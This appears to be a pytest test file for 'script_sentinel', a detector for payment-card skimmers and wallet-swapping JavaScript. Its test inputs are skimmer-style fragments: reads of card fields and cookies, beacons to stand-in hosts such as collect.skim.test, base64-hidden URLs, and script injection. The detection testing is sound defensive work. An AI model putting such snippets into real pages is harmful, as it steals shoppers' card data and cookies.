"""Skimmer heuristics: the synthetic corpus, each rule, and how verdicts combine signals."""

from __future__ import annotations

import base64
import re
from pathlib import Path

import pytest

from script_sentinel import heuristics
from script_sentinel.db.models import Severity
from script_sentinel.heuristics import (
    Category,
    Context,
    Destination,
    Report,
    Signal,
    assess,
    inspect,
    worst,
)

CORPUS = Path(__file__).parent / "fixtures" / "heuristics"
SHOP = Context(script_host="cdn.vendor.test", site_hosts=frozenset({"shop.example.test"}))


def _b64(text: str) -> str:
    return base64.b64encode(text.encode()).decode()


def _signals(source: str) -> set[tuple[str, str]]:
    return {s.fingerprint for s in inspect(source).signals}


def _signal(source: str, rule: str) -> Signal:
    [signal] = [s for s in inspect(source).signals if s.rule == rule]
    return signal


def _verdicts(source: str, context: Context = SHOP) -> dict[str, Severity]:
    return {v.rule: v.severity for v in assess(inspect(source), context)}


def _corpus() -> list[Path]:
    return sorted(CORPUS.rglob("*.js"))


@pytest.mark.parametrize("path", _corpus(), ids=lambda p: f"{p.parent.name}/{p.stem}")
def test_corpus(path: Path) -> None:
    """Each fixture declares its context and the exact verdicts it must get."""
    source = path.read_text()
    header = re.search(r"// context: (.*)", source)
    expect = re.search(r"// expect: (.*)", source)
    assert header is not None
    assert expect is not None
    fields = dict(re.findall(r"(\w+)=([\w.-]+)", header.group(1)))
    context = Context(fields["script_host"], frozenset({fields["site"]}))
    verdicts = assess(inspect(source), context)
    got = {v.rule: v.severity.value for v in verdicts}
    wanted = (
        {}
        if expect.group(1).strip() == "none"
        else dict(pair.split("=") for pair in expect.group(1).split())
    )
    assert got == wanted
    if path.parent.name == "malicious":
        assert worst(verdicts) in (Severity.MEDIUM, Severity.HIGH)
    else:
        assert worst(verdicts) in (None, Severity.LOW)


def test_the_corpus_covers_both_sides() -> None:
    names = {p.parent.name for p in _corpus()}
    assert names == {"malicious", "benign"}
    assert len(_corpus()) >= 20


# --- Partial evaluation -------------------------------------------------------------------


def test_atob_charcode_and_reverse_are_decoded() -> None:
    source = f"""
        fetch(atob("{_b64("https://a.skim.test/1")}"));
        fetch(window.atob("{_b64("https://b.skim.test/2")}"));
        fetch(String.fromCharCode({", ".join(str(ord(c)) for c in "https://c.skim.test/")}));
        fetch("/3/tset.miks.d//:sptth".split("").reverse().join(""));
        fetch(atob(atob("{_b64(_b64("https://e.skim.test/"))}")));
        fetch(atob(atob(atob("{_b64(_b64(_b64("https://f.skim.test/")))}"))));
        fetch(S.fromCharCode({", ".join(str(ord(c)) for c in "https://g.skim.test/")}));
    """
    report = inspect(source)
    assert report.hidden_hosts == {
        "a.skim.test",
        "b.skim.test",
        "c.skim.test",
        "d.skim.test",
        "e.skim.test",
        "f.skim.test",  # up to three layers are unwrapped
        "g.skim.test",
    }
    sinks = [s for s in report.signals if s.rule == "exfil.fetch"]
    assert {s.destination for s in sinks} == {Destination.HIDDEN}
    encoded = {s.key for s in report.signals if s.rule == "obfuscation.encoded"}
    assert encoded == {"base64", "charcode", "reversed"}


@pytest.mark.parametrize(
    "call",
    [
        'atob("not base64!")',  # not decodable
        'atob("//79/A==")',  # decodes to bytes that aren't UTF-8
        'atob("AQI=")',  # decodes to control characters
        "String.fromCharCode",  # not called
        "atob(x)",  # not a literal
        "String.fromCharCode(0x110000)",  # out of range
        "String.fromCharCode(1e400)",  # not an integer literal
        "String.fromCharCode()",
        "String.fromCharCode(104, x)",
        '"abc".split("").reverse()',  # stops short
        '"abc".split(",").reverse().join("")',  # not a character split
        '"abc".split("").sort().join("")',
    ],
)
def test_calls_that_are_not_decoded(call: str) -> None:
    assert inspect(f"var u = {call};").hidden_hosts == frozenset()


def test_an_atob_at_the_end_of_the_input_is_left_alone() -> None:
    assert inspect("x = atob(").signals == []
    assert inspect('"a".split("").reverse').signals == []


def test_url_safe_base64_decodes() -> None:
    encoded = base64.urlsafe_b64encode(b"https://u.skim.test/?a=b~~").decode().rstrip("=")
    assert "-" in encoded or "_" in encoded
    assert inspect(f'fetch(atob("{encoded}"))').hidden_hosts == {"u.skim.test"}


def test_joined_literals_hide_hosts_and_words() -> None:
    assert inspect('var u = "https://" + "x.skim" + ".test/";').hidden_hosts == {"x.skim.test"}
    # A host that one piece already spells out isn't hidden by joining.
    assert inspect('var u = "https://x.skim.test" + "/path";').hidden_hosts == frozenset()
    assert ("obfuscation.encoded", "assembled") in _signals('var m = "send" + "Beacon";')
    assert _signals('var m = "send" + "Data";') == set()


def test_folding_stops_at_the_size_cap(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(heuristics, "MAX_FOLDED", 10)
    assert inspect('var u = "https://" + "x.skim.test/";').hidden_hosts == frozenset()


def test_computed_members_are_read_as_properties() -> None:
    signals = _signals('navigator["sendBeacon"]("https://t.test/", document["cookie"]);')
    assert ("exfil.beacon", "t.test") in signals
    assert ("collect.stored_data", "cookie") in signals
    # A plain literal name is how minifiers write it: not obfuscation.
    assert not any(rule == "obfuscation.hidden_property" for rule, _ in signals)
    hidden = _signals(f'window[atob("{_b64("eval")}")]("1");')
    assert ("obfuscation.hidden_property", "eval") in hidden
    assert ("obfuscation.eval", "eval") in hidden
    # Not a member access: an array literal after an operator.
    assert _signals('x = ["sendBeacon"];') == set()


def test_escaped_strings_and_identifiers() -> None:
    hidden = inspect(r'fetch("\x68\x74\x74\x70\x73://e.skim.test/");')
    assert hidden.hidden_hosts == {"e.skim.test"}
    [sink] = [s for s in hidden.signals if s.rule == "exfil.fetch"]
    assert sink.destination is Destination.HIDDEN
    # Escaped accents are ordinary text, not hiding.
    u = chr(92) + "u"  # a backslash and "u", spelled out so no tool along the way decodes it
    assert inspect(f'var s = "caf{u}00e9 cr{u}00e8me br{u}00fbl{u}00e9e";').signals == []
    signals = _signals(f"window.{u}0065val('1'); e{u}0076al('2');")
    assert ("obfuscation.hidden_property", "eval") in signals
    assert ("obfuscation.eval", "eval") in signals


def test_template_literals() -> None:
    signals = _signals("fetch(`https://${host}/c`); var f = `#cc-number`; x = `${a}cvv${b}`;")
    assert ("exfil.fetch", "unknown") in signals
    assert ("collect.card_field", "cc-number") in signals
    assert ("collect.card_field", "cvv") in signals
    assert ("exfil.fetch", "t.test") in _signals("fetch(`https://t.test/${a}`, {b: `${c}`});")


# --- Sinks and destinations ---------------------------------------------------------------


@pytest.mark.parametrize(
    ("source", "rule", "key", "destination"),
    [
        ('navigator.sendBeacon("https://a.test/c", d)', "exfil.beacon", "a.test", "literal"),
        ("navigator.sendBeacon()", "exfil.beacon", "unknown", "unknown"),
        ('fetch("/api/x")', "exfil.fetch", "relative", "relative"),
        ('fetch("api/x")', "exfil.fetch", "relative", "relative"),
        ('window.fetch("//p.test/x")', "exfil.fetch", "p.test", "literal"),
        ('fetch("data:text/plain,hi")', "exfil.fetch", "unknown", "unknown"),
        ('fetch("" + u)', "exfil.fetch", "unknown", "unknown"),
        ("fetch()", "exfil.fetch", "unknown", "unknown"),
        ("fetch(u)", "exfil.fetch", "unknown", "unknown"),
        (
            'x = new XMLHttpRequest(); x.open("POST", "https://x.test/")',
            "exfil.xhr",
            "x.test",
            "literal",
        ),
        ("x = new XMLHttpRequest(); x.open(u)", "exfil.xhr", "unknown", "unknown"),
        ("x = new XMLHttpRequest()", "exfil.xhr", "unknown", "unknown"),
        (
            'i = new Image(); i.src = "https://i.test/p.gif?" + d',
            "exfil.image",
            "i.test",
            "literal",
        ),
        ("i = new Image()", "exfil.image", "unknown", "unknown"),
        (
            'i = document.createElement("img"); i.src = "/p.gif"',
            "exfil.image",
            "relative",
            "relative",
        ),
        ('new WebSocket("wss://w.test/s")', "exfil.websocket", "w.test", "literal"),
        ("new WebSocket", "exfil.websocket", "unknown", "unknown"),
        ('$.post("https://j.test/c", d)', "exfil.ajax", "j.test", "literal"),
        ('jQuery.getJSON("/x")', "exfil.ajax", "relative", "relative"),
        ("$.ajax({type: 'POST', data: d})", "exfil.ajax", "unknown", "unknown"),
        ("$.ajax()", "exfil.ajax", "unknown", "unknown"),
    ],
)
def test_sinks(source: str, rule: str, key: str, destination: str) -> None:
    signal = _signal(source, rule)
    assert signal.key == key
    assert signal.destination == Destination(destination)
    assert signal.category is Category.EXFILTRATION


@pytest.mark.parametrize(
    "source",
    [
        "cache.fetch(u)",  # a method, not the global
        "function fetch(u) {}",  # a definition
        "window.a.fetch(u)",  # a method of a global's property
        "x.sendBeacon",  # not called
        "new XMLHttpRequestUpload()",
        "Image()",  # not constructed
        "obj.get(1)",  # not jQuery
        'document.createElement("div")',
        "document.createElement(tag)",
        "document.createElement()",
    ],
)
def test_lookalikes_are_not_sinks(source: str) -> None:
    assert not [s for s in inspect(source).signals if s.category is Category.EXFILTRATION]


def test_bound_destinations_use_the_assignment_before_the_call() -> None:
    source = """
        var u = "https://first.test/";
        fetch(u);
        u = "https://second.test/";
        fetch(u);
        fetch(later);
        var later = "https://later.test/";
        var n = compute();
        fetch(n);
        var t = `${v = "https://in-template.test/"}`;
        fetch(v);
        fetch(, x);
        $.ajax({type: "POST", url: u});
    """
    keys = [s.key for s in inspect(source).signals if s.rule in ("exfil.fetch", "exfil.ajax")]
    assert keys == [
        "first.test",
        "second.test",
        "later.test",
        "unknown",
        "in-template.test",
        "second.test",  # keys are distinct: fetch(, x) is one more "unknown"
    ]


def test_image_src_through_set_attribute() -> None:
    source = 'var i = document.createElement("img"); i.setAttribute("src", "https://s.test/p");'
    assert _signal(source, "exfil.image").key == "s.test"
    source = 'var i = new Image(); i.setAttribute("alt", "x"); i.setAttribute("src");'
    assert _signal(source, "exfil.image").key == "unknown"


# --- Collection, wallets, obfuscation and injection ---------------------------------------


def test_card_fields() -> None:
    source = """
        q("#cc-number"); q("[name=cc_exp_month]"); q("input[name='cardNumber']");
        q("#card-holder"); q(".cvc2"); q("#security_code"); q("#expiry-date");
        form.cvv.value; form?.ccNum; label = "Discover the card"; q("#cvvx");
    """
    keys = {s.key for s in inspect(source).signals if s.rule == "collect.card_field"}
    assert keys == {
        "cc-number",
        "cc-exp-month",
        "cardnumber",
        "card-holder",
        "cvc2",
        "security-code",
        "expiry-date",
        "cvv",
        "ccnum",
    }
    assert _signals('var essay = "' + "cvv " * 600 + '";') == set()


def test_form_listeners_and_serialization() -> None:
    source = """
        el.addEventListener("keyup", f); el.addEventListener("click", f);
        el.addEventListener(name, f); el.addEventListener();
        $(f).on("submit.plugin change", g); el.onblur = g; el.onclick = g;
        new FormData(f); $(f).serializeArray(); document.forms[0];
        document.querySelectorAll("select, textarea"); document.querySelectorAll(".x");
        document.querySelectorAll(sel); el.onpaste = g;
    """
    signals = _signals(source)
    assert {key for rule, key in signals if rule == "collect.form_listener"} == {
        "keyup",
        "submit",
        "change",
        "blur",
        "paste",
    }
    assert {key for rule, key in signals if rule == "collect.form_serialization"} == {
        "FormData",
        "serializeArray",
        "document.forms",
        "select",
    }


def test_stored_data() -> None:
    signals = _signals("a = document.cookie; b = localStorage; c = window.sessionStorage;")
    assert signals == {
        ("collect.stored_data", "cookie"),
        ("collect.stored_data", "localStorage"),
        ("collect.stored_data", "sessionStorage"),
    }


def test_wallet_signals() -> None:
    source = r"""
        a = "send to 0xAbCdEf0123456789abcdef0123456789ABCDEF01 now";
        b = "1BoatSLRHtKNngkdXEeobR76b53LETtpyT";
        c = "TJCnKsPa7y5okkXvQAidZBzqx3QyQ6sxMW";
        d = "0x123";
        e = new RegExp("^T[1-9A-HJ-NP-Za-km-z]{33}$");
        f = /\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b/;
        g = /^ab+c$/;
        el.addEventListener("cut", h); el.oncopy = h; document.execCommand("copy");
        document.execCommand("bold"); document.execCommand(cmd);
        navigator.clipboard.readText(); x.write(1);
    """
    signals = _signals(source)
    assert {key for rule, key in signals if rule == "wallet.address"} == {
        "0xAbCdEf0123456789abcdef0123456789ABCDEF01",
        "1BoatSLRHtKNngkdXEeobR76b53LETtpyT",
        "TJCnKsPa7y5okkXvQAidZBzqx3QyQ6sxMW",
    }
    assert len([1 for rule, _ in signals if rule == "wallet.matcher"]) == 2
    assert {key for rule, key in signals if rule == "wallet.clipboard"} == {
        "cut",
        "copy",
        "execCommand.copy",
        "clipboard.readText",
    }


def test_dynamic_code() -> None:
    signals = _signals(
        """
        eval(code); new Function("a", "return a"); Function(atob(x));
        setTimeout("tick()", 10); setInterval(tick, 10); setTimeout("a" + b, 1);
        new Function; eval(unescape(s)); eval(String.fromCharCode(c));
        obj.eval(x); function eval2() {}
        """
    )
    assert ("obfuscation.eval", "eval") in signals
    assert ("obfuscation.eval", "Function") in signals
    assert ("obfuscation.eval", "setTimeout") in signals
    assert ("obfuscation.eval", "setInterval") not in signals
    assert ("obfuscation.eval_decoded", "Function") in signals
    assert ("obfuscation.eval_decoded", "eval") in signals


def test_obfuscator_identifiers_need_ten_names() -> None:
    names = ",".join(f"_0x{i:04x}=1" for i in range(9))
    assert _signals(f"var {names};") == set()
    report = inspect(f"var {names},_0xffff=2;")
    [signal] = report.signals
    assert (signal.rule, signal.count) == ("obfuscation.identifiers", 10)


def test_injection() -> None:
    source = """
        document.writeln('<script src="/local.js"></script>');
        el.insertAdjacentHTML("beforeend", "<script src='https://m.test/x.js'></script>");
        el.innerHTML = "<p>hi</p>";
        el.outerHTML = "<script>inline()</script>";
        document.write(); document.write("<b>bold</b>");
        document.write('<script src="data:text/javascript,1"></script>');
        import("https://mod.test/m.js"); import("./local.js"); x.import("y");
        s = document.createElement("script"); s.src = u;
    """
    report = inspect(source)
    markup = {s.key: (s.destination, s.host) for s in report.signals if s.rule == "inject.markup"}
    assert markup == {
        "writeln": (Destination.RELATIVE, None),
        "insertAdjacentHTML": (Destination.LITERAL, "m.test"),
        "outerHTML": (Destination.UNKNOWN, None),
        "document.write": (Destination.UNKNOWN, None),
    }
    assert ("inject.import", "mod.test") in {s.fingerprint for s in report.signals}
    assert ("inject.script", "unknown") in {s.fingerprint for s in report.signals}
    # The src is decoded and joined onto the tag: a hidden source.
    joined = inspect(f'document.write("<script src=\'" + atob("{_b64("https://h.test/a")}"))')
    [signal] = [s for s in joined.signals if s.rule == "inject.markup"]
    assert (signal.destination, signal.host) == (Destination.HIDDEN, "h.test")
    hidden = inspect("document.write(" + repr(f"<script src={_b64('x')}>").replace("'", '"') + ")")
    [signal] = [s for s in hidden.signals if s.rule == "inject.markup"]
    assert signal.destination is Destination.RELATIVE
    encoded = f'document.write(atob("{_b64("<script src=https://h.test/a.js></script>")}"))'
    [signal] = [s for s in inspect(encoded).signals if s.rule == "inject.markup"]
    assert (signal.destination, signal.host) == (Destination.HIDDEN, "h.test")


def test_bare_base64_literals_with_urls_are_hidden_urls() -> None:
    payload = _b64("https://bare.skim.test/collect?x=1")
    report = inspect(f'var cfg = ["{payload}"];')
    assert report.hidden_hosts == {"bare.skim.test"}
    assert {s.rule for s in report.signals} == {"url.hidden", "obfuscation.encoded"}
    # A long base64 value that decodes to nothing interesting is just data.
    assert inspect(f'var id = "{_b64("just an ordinary sentence here")}";').signals == []


# --- Reports ------------------------------------------------------------------------------


def test_counts_evidence_and_truncation(monkeypatch: pytest.MonkeyPatch) -> None:
    report = inspect('fetch("/a"); fetch("/b");\nfetch("/c")')
    [signal] = report.signals
    assert signal.count == 3
    assert signal.offset == 0
    assert signal.evidence.startswith('fetch("/a"); fetch("/b"); fetch("/c")')
    assert not signal.evidence.endswith("…")
    long = inspect("fetch(u);" + " x;" * 100)
    assert long.signals[0].evidence.endswith(" …")
    monkeypatch.setattr(heuristics, "MAX_SIGNAL_KEYS", 2)
    many = inspect('fetch("https://a.test/"); fetch("https://b.test/"); fetch("https://c.test/");')
    assert len(many.signals) == 2
    assert many.truncated
    assert many.to_dict()["truncated"] is True


def test_serialization() -> None:
    report = inspect('navigator.sendBeacon("https://s.test/", document.cookie)')
    as_dict = report.to_dict()
    beacon = next(s for s in as_dict["signals"] if s["rule"] == "exfil.beacon")
    assert beacon == {
        "rule": "exfil.beacon",
        "category": "exfiltration",
        "key": "s.test",
        "count": 1,
        "evidence": 'sendBeacon("https://s.test/", document.cookie)',
        "offset": 10,
        "host": "s.test",
        "destination": "literal",
    }
    cookie = next(s for s in as_dict["signals"] if s["rule"] == "collect.stored_data")
    assert "host" not in cookie
    assert "destination" not in cookie
    [verdict] = [v for v in assess(report) if v.rule == "exfil.stored_data"]
    assert verdict.to_dict() == {
        "rule": "exfil.stored_data",
        "severity": "medium",
        "reason": "reads cookie and sends data to s.test",
        "signals": [
            {"rule": "collect.stored_data", "key": "cookie"},
            {"rule": "exfil.beacon", "key": "s.test"},
        ],
    }


def test_every_rule_is_documented() -> None:
    assert all(
        rule.split(".")[0] in {"exfil", "collect", "wallet", "obfuscation", "inject", "url"}
        for rule in heuristics.RULES
    )
    assert worst([]) is None


# --- Verdicts -----------------------------------------------------------------------------


def test_own_destinations_are_trusted() -> None:
    source = (
        'q("#cc-number"); fetch("https://cdn.vendor.test/t"); fetch("https://shop.example.test/t");'
    )
    assert _verdicts(source) == {}
    assert _verdicts(source, Context()) == {"skimmer.card_data": Severity.HIGH}
    assert Context(None, frozenset({"a.test"})).trusted == {"a.test"}
    assert SHOP.trusted == {"cdn.vendor.test", "shop.example.test"}


def test_card_data_to_a_runtime_address_is_medium() -> None:
    assert _verdicts('q("#cvv"); fetch(endpoint);') == {"skimmer.card_data": Severity.MEDIUM}


def test_a_verdict_needs_a_new_signal() -> None:
    old = inspect('q("#cc-number"); navigator.sendBeacon("https://collect.skim.test/", d);')
    assert assess(old, SHOP, previous=old) == []
    # A bug fix elsewhere in the same skimmer-shaped library: still nothing new.
    fixed = inspect(
        'q("#cc-number"); navigator.sendBeacon("https://collect.skim.test/", d); fix();'
    )
    assert assess(fixed, SHOP, previous=old) == []
    # A second beacon is more of the same signal: the verdict counts again.
    more = inspect(
        'q("#cc-number"); navigator.sendBeacon("https://collect.skim.test/", d);'
        'navigator.sendBeacon("https://collect.skim.test/", e);'
    )
    assert [v.rule for v in assess(more, SHOP, previous=old)] == [
        "skimmer.card_data",
    ]
    assert [s.fingerprint for s in more.new_since(old)] == [("exfil.beacon", "collect.skim.test")]
    assert len(Report().new_since(None)) == 0


def test_wallet_verdicts() -> None:
    address = '"0x1111111111111111111111111111111111111111"'
    matcher = "/^0x[a-fA-F0-9]{40}$/"
    assert _verdicts(f"a = {address}; b = {matcher};") == {"wallet.swap": Severity.HIGH}
    assert _verdicts(f"b = {matcher}; navigator.clipboard.writeText(x);") == {
        "wallet.swap": Severity.HIGH
    }
    assert _verdicts(f"a = {address};") == {"wallet.address": Severity.MEDIUM}
    assert _verdicts(f"b = {matcher};") == {"wallet.matcher": Severity.MEDIUM}
    assert _verdicts("navigator.clipboard.writeText(x);") == {}


def test_injection_verdicts() -> None:
    assert (
        _verdicts('s = document.createElement("script"); s.src = "https://cdn.vendor.test/a.js";')
        == {}
    )
    assert _verdicts(
        's = document.createElement("script"); s.src = "https://other.test/a.js";'
    ) == {"inject.script": Severity.MEDIUM}
    assert _verdicts('s = document.createElement("script"); s.src = base + "/a.js";') == {
        "inject.script": Severity.MEDIUM
    }


def test_hidden_urls_and_outbound() -> None:
    assert _verdicts(f'var cfg = atob("{_b64("https://h.test/")}");') == {
        "url.hidden": Severity.MEDIUM,
        "obfuscation.packed": Severity.MEDIUM,
    }
    # Used by a sink, the hidden host is reported once, by the sink verdict.
    rules = _verdicts(f'fetch(atob("{_b64("https://h.test/")}"));')
    assert rules == {
        "exfil.hidden_destination": Severity.HIGH,
        "obfuscation.packed": Severity.MEDIUM,
    }
    assert _verdicts('fetch("https://elsewhere.test/a");') == {"exfil.outbound": Severity.LOW}


def test_many_hosts_are_summarized() -> None:
    sinks = "".join(f'fetch("https://h{i}.test/");' for i in range(5))
    [verdict] = assess(inspect(sinks), SHOP)
    assert verdict.reason == "sends data to h0.test, h1.test, h2.test and 2 more"
    fields = "".join(f'q("#{name}");' for name in ("cvv", "cvc", "cc-exp", "cc-number", "cc-name"))
    [verdict] = assess(inspect(fields + 'fetch("https://x.test/");'), SHOP)
    assert verdict.reason.startswith(
        "reads payment card fields (cc-exp, cc-name, cc-number, cvc, …)"
    )
